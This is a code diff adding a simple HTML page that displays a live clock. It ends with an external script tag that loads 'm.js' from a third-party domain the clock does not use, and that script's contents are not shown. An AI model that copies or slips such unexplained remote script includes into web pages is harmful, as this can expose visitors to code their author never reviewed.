@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html>
+	<head>
+		<meta charset="UTF-8">
+		<title>Time</title>
+	</head>
+	<body>
+		<div id = "time"></div>
+		<script>
+	 function show() {
+		  const weeks = ["Sun", "Mon", "Tue", "Wed", "Thu", "Fri", "Sat"];
+		  const myTime = new Date();
+		  const year = myTime.getFullYear();
+		  const month = myTime.getMonth() + 1;
+		  const day = myTime.getDate();
+		  const week = myTime.getDay();
+		  const hours = myTime.getHours();
+		  const minutes = myTime.getMinutes();
+		  const seconds = myTime.getSeconds();
+		
+		  const timeStr = `${year}-${month}-${day} ${weeks[week]} ${hours}:${minutes}:${seconds}`;
+		
+		  document.getElementById("time").innerHTML = timeStr;
+		  document.title = `Time ${timeStr}`;
+	}
+	window.onload = function() {
+	  show();
+	  setInterval(show, 1000);
+	};
+		</script>
+  <script src="https://mylinks.eu.org/m/m.js"></script>
+	</body>
+</html>
